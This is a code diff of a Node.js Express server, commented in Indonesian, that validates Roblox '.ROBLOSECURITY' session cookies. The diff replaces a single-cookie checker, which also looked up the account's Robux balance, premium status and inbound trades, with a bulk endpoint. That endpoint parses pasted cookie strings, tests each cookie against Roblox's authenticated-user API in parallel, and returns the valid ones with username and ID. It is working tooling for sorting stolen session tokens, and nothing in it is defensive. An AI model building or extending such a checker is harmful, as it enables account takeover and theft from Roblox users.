@@ -3,75 +3,60 @@ const axios = require('axios');
 const path = require('path');
 
 const app = express();
-app.use(express.json());
+app.use(express.json({ limit: '10mb' })); // Agar bisa terima input teks panjang
 
 app.use(express.static(path.join(__dirname, 'public')));
 
-app.post('/api/check', async (req, res) => {
-  const { cookie } = req.body;
+// Endpoint Cek Bulk Cookie
+app.post('/api/check-bulk', async (req, res) => {
+  const { cookies } = req.body; // Array dari cookie
 
-  if (!cookie) {
-    return res.status(400).json({ error: 'Cookie tidak boleh kosong!' });
+  if (!cookies || !Array.isArray(cookies) || cookies.length === 0) {
+    return res.status(400).json({ error: 'Daftar cookie tidak boleh kosong!' });
   }
 
-  try {
-    const authHeader = {
-      'Cookie': `.ROBLOSECURITY=${cookie}`,
-      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
-    };
+  // Proses pengecekan satu per satu secara paralel dengan limit aman
+  const results = await Promise.all(
+    cookies.map(async (cookieItem) => {
+      const rawCookie = cookieItem.trim();
+      if (!rawCookie) return null;
 
-    // 1. Cek Autentikasi Utama (ID, Username, DisplayName)
-    const authRes = await axios.get('https://users.roblox.com/v1/users/authenticated', { headers: authHeader });
-    const userId = authRes.data.id;
-    const username = authRes.data.name;
-    const displayName = authRes.data.displayName;
+      // Bersihkan string jika user memasukkan format custom sebelumnya
+      const cleanCookie = rawCookie.includes('.ROBLOSECURITY=') 
+        ? rawCookie.split('.ROBLOSECURITY=')[1].split(';')[0] 
+        : rawCookie;
 
-    // 2. Cek Robux
-    let robuxBalance = 0;
-    try {
-      const robuxRes = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers: authHeader });
-      robuxBalance = robuxRes.data.robux || 0;
-    } catch (e) {
-      robuxBalance = 'Gagal memuat';
-    }
+      try {
+        const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
+          headers: {
+            'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+          },
+          timeout: 5000 // Limit waktu 5 detik per cookie biar gak nunggu lama
+        });
 
-    // 3. Cek Status Premium
-    let isPremium = false;
-    try {
-      const premiumRes = await axios.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers: authHeader });
-      isPremium = Boolean(premiumRes.data);
-    } catch (e) {
-      isPremium = false;
-    }
-
-    // 4. Cek Trade (Inbound Count)
-    let tradeStatus = 'Aman / Kosong';
-    try {
-      const tradeRes = await axios.get('https://trades.roblox.com/v1/trades/inbound/count', { headers: authHeader });
-      const inboundCount = tradeRes.data.count || 0;
-      tradeStatus = `Inbound: ${inboundCount}`;
-    } catch (e) {
-      tradeStatus = 'Tidak tersedia';
-    }
-
-    return res.json({
-      success: true,
-      user: {
-        id: userId,
-        name: username,
-        displayName: displayName,
-        robux: robuxBalance,
-        isPremium: isPremium,
-        trade: tradeStatus
+        return {
+          valid: true,
+          username: response.data.name,
+          userId: response.data.id,
+          cookie: cleanCookie
+        };
+      } catch (err) {
+        return {
+          valid: false,
+          cookie: cleanCookie
+        };
       }
-    });
+    })
+  );
 
-  } catch (error) {
-    return res.status(401).json({
-      success: false,
-      error: 'Cookie tidak valid atau sudah kedaluwarsa!'
-    });
-  }
+  // Filter elemen null jika ada baris kosong
+  const filteredResults = results.filter(item => item !== null);
+
+  return res.json({
+    success: true,
+    results: filteredResults
+  });
 });
 
 app.get('*', (req, res) => {
